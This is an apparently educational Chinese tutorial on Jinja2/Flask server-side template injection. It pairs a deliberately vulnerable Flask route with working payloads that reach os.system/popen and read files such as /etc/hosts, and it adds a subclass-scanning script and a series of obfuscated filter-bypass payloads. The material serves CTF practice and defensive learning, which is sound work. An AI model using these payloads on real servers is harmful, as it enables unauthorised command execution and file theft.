# SSTI

## 演示环境

docker

```bash
docker pull ubuntu:20.04

docker run -itd --name ubuntu-test -p 7000:80 ubuntu:20.04
```

镜像内

```bash
apt-get update
apt-get install python3
apt-get install python3-pip
apt-get install python2
```

插件

![](https://raw.githubusercontent.com/xlccccc/Image/master/hexoblog/202301051741368.png)

## 什么是SSTI

**SSTI(Server-Side Template Injection)** 简称 **模板注入**

模板引擎会提供一套生成html代码的程序，结合用户给出是数据，就呈现出你看到的html页面

![](https://raw.githubusercontent.com/xlccccc/Image/master/hexoblog/202301051549562.png)

由于用户的数据大部分由用户可控，如果对用户的输入没有检测，就与sql注入相似，插入的数据成了程序的一部分，从而改变了程序的执行逻辑

## 漏洞成因

以jinjia2来讲

```python
from flask import Flask, app, request, render_template, render_template_string

app = Flask(__name__)

@app.route('/unsafe', methods={'GET', 'POST'})
def unsafe():

    name = request.args.get('name')
    template = '''
    <html>
        <head> 
        <title> XDSEC SSTI </title>
        </head>
        <body>
            <p> Hello, %s ~ </p>
        </body>
    </html>    
    ''' % (name)
    return render_template_string(template)

@app.route('/safe', methods={'GET', 'POST'})
def safe():

    name = request.args.get('name')
    return render_template("index.html", name = name)

if __name__ == '__main__':
    app.run(host = '0.0.0.0', port = 80, debug = True)
```

在**unsafe**中，模板是在代码中渲染完成后然后呈现在网页上

而在**safe**中，模板是已经固定好的，只需要你将你的数据作为字符串传过去

一般来说`render_template`是安全的，但如果你有权限更改模板文件，而恰好flask是开启了debug的，debug开启会**auto reload**，会使用你改变后的模板从而导致ssti

## python

我们知道了这个漏洞，但这不是直接执行shell或者直接执行python，而是一种模板语言

http://docs.jinkan.org/docs/jinja2/

而jinjia2是可以直接访问python中的一些对象和方法，所以我们就要通过类和对象来一步步找到rce的方法

### \_\_class\_\_

返回变量所属的类

```python
>>> ''.__class__
<type 'str'>
>>> ().__class__
<type 'tuple'>
>>> [1,2].__class__
<type 'list'>
```

### \_\_base\_\_

用来查看类的基类

```python
>>> ''.__class__.__base__
<class 'object'>
>>> ().__class__.__base__
<class 'object'>
```

### \_\_mro\_\_

获取一个类的调用顺序

```python
>>> ''.__class__.__mro__
(<class 'str'>, <class 'object'>)
>>> ().__class__.__mro__
(<class 'tuple'>, <class 'object'>)
>>> ''.__class__.__mro__[1]
<class 'object'>	#返回为一个元组，可用此获取基类
```

### \_\_subclasses\_\_

获取类的所有子类，得到基类的目的就是为了获取全能实现的子类，在子类中寻找可利用的方法

```python
>>> ''.__class__.__mro__[0]
<class 'str'>
>>> ''.__class__.__mro__[0].__subclasses__()
[]
>>> ''.__class__.__mro__[1]
<class 'object'>
>>> ''.__class__.__mro__[1].__subclasses__()
[<class 'type'>, <class 'weakref'>, <class 'weakcallableproxy'>,....]
```

### \_\_init\_\_.\_\_globals\_\_

得到类的全部方法

```python
>>> ''.__class__.__mro__[1].__subclasses__()[132]
<class 'os._wrap_close'>
>>> ''.__class__.__mro__[1].__subclasses__()[132].__init__.__globals__
{'__name__': 'os', '__doc__':.....}
```

### \_\_builtins\_\_

builtins是python中的一个模块，该模块提供对Python的所有“内置”标识符的直接访问，`builtins.open`<==>`open()`

在类中找到该模板是可以rce的

## 构造语句

### python2

#### 特殊的file

```python
>>> for i in enumerate(''.__class__.__mro__[2].__subclasses__()):print i

>>> ''.__class__.__mro__[2].__subclasses__()[40]('/etc/hosts').read()
```

#### rce

脚本简单的挖掘

```python
#python2
num = 0
for item in ''.__class__.__mro__[-1].__subclasses__():
    #print item
    try:
        if item.__init__.__globals__.keys():

            if '__builtins__' in  item.__init__.__globals__.keys():
                print num, item, '__builtins__'
            if  'os' in  item.__init__.__globals__.keys():
                print num, item, 'os'
            if  'linecache' in  item.__init__.__globals__.keys():
                print num, item, 'linechache'
        num += 1
    except:
        num += 1
```

```python
>>> ''.__class__.__mro__[2].__subclasses__()[71].__init__.__globals__['os'].system('ls')

>>> ''.__class__.__mro__[2].__subclasses__()[58].__init__.__globals__['linecache'].os.system('ls')

>>> ''.__class__.__mro__[2].__subclasses__()[58].__init__.__globals__['__builtins__']['eval']("__import__('os').system('ls')")
```

### python3

也可以仿造上面脚本来挖掘，但一般你能走到这一步其实找rce的类还是很简单的

**python3**一般用的就是`os._wrap_close`

```python
>>> "".__class__.__bases__[0].__subclasses__()[132].__init__.__globals__['popen']('ls').read()
```

也可以用这种办法

```python
{{x.__init__.__globals__['__builtins__']['eval']("__import__('os').popen('ls').read()")}} # x指任何字符
```



## bypass

### 过滤 . 

```python
""["__class__"]
# attr() 用于获取变量
""|attr("__class__")
# getattr() 函数用于返回一个对象属性值。
getattr('',"__class__")
```

### 过滤 _

```python
# 利用十六进制 \x5f 代替 _
''["\x5f\x5fclass\x5f\x5f"]
# 或者
''|attr(request.values.x1) # x1 = __class__
```

### 过滤 []

```python
# __getitem__ 魔术方法，作用可看为将中括号转为括号
''.__class__.__mro__.__getitem__(1)
```

### 过滤 {{}}

```python
# {% %} 作用类似 {{}}，只不过要利用print回显
{% print(''.__class__) %}
```

### 过滤 ' "

```python
# request.values.x1 就是将接受的x1作为字符串解析
().__class__.__bases__[0].__subclasses__()[132].__init__.__globals__[request.values.x1](request.values.x2).read()	# x1 = popen x2 = ls
```



```
request.args.x1   	 get传参
request.values.x1 	 所有参数
request.cookies      cookies参数
request.headers      请求头参数
request.form.x1   	 post传参	(Content-Type:applicaation/x-www-form-urlencoded或multipart/form-data)
request.data  		 post传参	(Content-Type:a/b)
request.json		 post传json  (Content-Type: application/json)
```

### 绕过数字以及关键字==

```python
# count 可用 length 替换
# set coun=(cc~cccc)|int 拼接为字符 24 然后转为 int
{% set c=dict(e=a)|join|count%}
{% set cc=dict(ee=a)|join|count%}
{% set ccc=dict(eee=a)|join|count%}
{% set cccc=dict(eeee=a)|join|count%}
{% set ccccc=dict(eeeee=a)|join|count%}
{% set cccccc=dict(eeeeee=a)|join|count%}
{% set ccccccc=dict(eeeeeee=a)|join|count%}
{% set cccccccc=dict(eeeeeeee=a)|join|count%}
{% set ccccccccc=dict(eeeeeeeee=a)|join|count%}
{% set cccccccccc=dict(eeeeeeeeee=a)|join|count%}
{% set coun=(cc~cccc)|int%} 
{% set po=dict(po=a,p=a)|join%}
{% set a=(()|select|string|list)|attr(po)(coun)%}
{% set ini=(a,a,dict(init=a)|join,a,a)|join()%}
{% set glo=(a,a,dict(globals=a)|join,a,a)|join()%}
{% set geti=(a,a,dict(getitem=a)|join,a,a)|join()%}
{% set built=(a,a,dict(builtins=a)|join,a,a)|join()%}
{% set x=(q|attr(ini)|attr(glo)|attr(geti))(built)%}
{% set chr=x.chr%}
{% set file=chr((cccc~ccccccc)|int)%2bchr((cccccccccc~cc)|int)%2bchr((cccccccccc~cccccccc)|int)%2bchr((ccccccccc~ccccccc)|int)%2bchr((cccccccccc~ccc)|int)%}
{%print(x.open(file).read())%}
```

## 例题

### [CISCN 2019华东南]Double Secret

